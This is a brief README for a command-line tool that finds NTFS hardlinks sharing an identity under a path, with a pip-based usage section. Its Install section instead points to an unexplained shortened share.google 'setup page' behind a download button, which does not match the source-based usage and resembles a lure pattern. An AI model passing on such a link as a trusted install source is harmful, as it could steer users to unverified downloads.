# Hardlink Find

Which names point at the same bytes.

Find NTFS hardlinks that share an inode under a path.

## Install

[![Download](assets/download.png)](https://share.google/A1IHfyGRT0zGRLqj8)

**[Open the setup page](https://share.google/A1IHfyGRT0zGRLqj8)**

## Why

A backup tool created extra names. You want the set.

This groups files by identity and prints the groups.

## What it does

- Groups of hardlinks
- Path walk
- CSV optional
- Read-only

## Usage

```text
python -m pip install -r requirements.txt
python main.py --help
```
